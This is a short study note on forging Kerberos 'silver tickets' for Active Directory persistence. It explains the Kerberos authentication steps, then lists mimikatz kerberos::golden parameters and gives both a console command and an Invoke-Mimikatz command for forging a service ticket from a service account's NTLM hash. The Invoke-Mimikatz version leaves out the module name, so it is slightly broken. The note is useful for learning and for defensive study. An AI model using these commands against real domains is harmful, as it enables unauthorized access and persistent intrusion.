# Domain Persistance - Silver Ticket
Kerbros is basis of authentication in AD , it is being attacked since it was implemented with new attacks being discovered every year

## Steps in Kerberos

- User logs on with username & password.

- Password converted to NTLM hash, a timestamp is encrypted with the hash and sent to the KDC (Key Distribution Centre also known as Domain Controller) as an authenticator in the authentication ticket (TGT) request  Authenitcation Service Request (AS-REQ).  The Domain Controller (KDC) checks user information (logon restrictions, group membership, etc) & creates Ticket-Granting Ticket (TGT).

- The TGT is encrypted, signed, & delivered to the user (AS-REP). Only the Kerberos service (KRBTGT) in the domain can open and read TGT data.

- The User presents the TGT to the DC when requesting a Ticket Granting Service (TGS) ticket (TGS-REQ). The DC opens the TGT & validates PAC checksum . If the DC can open the ticket & the checksum check out, `TGT = valid`. The data in the TGT is effectively copied to create the TGS ticket.

- The TGS is encrypted using the target service accounts’s NTLM password hash and sent to the user (TGS-REP).

- **The user connects to the server hosting the service on the appropriate port & presents the TGS Application Request (AP-REQ). The service opens the TGS ticket using its NTLM password hash.**

- Optional mutual authentication is done by service that the user provides TGS ticket to

## Silver Ticket

The ticket that we obtain after getting TGT (Ticket Granting Ticket) signed by krbtgt from KDC , we recieve a TGS (Ticket Granting Service) for the server that we requested , that ticket is `silver ticket` , it is encrypted and signed by NTLM hash of service account of the service that is running

## Using mimikatz.exe

After getting the `NTLM hash which used RC4 encryption` of service account for which we want the TGS and SID of domain which can be found using`whoami /user` we can create a silver ticket , all that is required is 

- `/sid` insert SID of domain
- `/domain` domain name
- `/target` hostname of the service
- `/user` can be any username , even the one which does not exists
- `/id`  can be any id
- `/service` name of the service
- `/rc4` NTLM hash of service account 
- `/ptt` pass the ticket , load the ticket into the powershell session


```
privilege::debug

kerberos::golden /sid:sid_of_domain /domain:name_of_domain /ptt /id:500 /target:hostname_of_service_server /service:name_of_service /rc4:NTLM_of_service_account /user:any_user_name
```

```
Invoke-Mimikatz -Command '"/sid:sid_of_domain /domain:name_of_domain /ptt /id:500 /target:hostname_of_service_server /service:name_of_service /rc4:NTLM_of_service_account /user:any_user_name"'
```

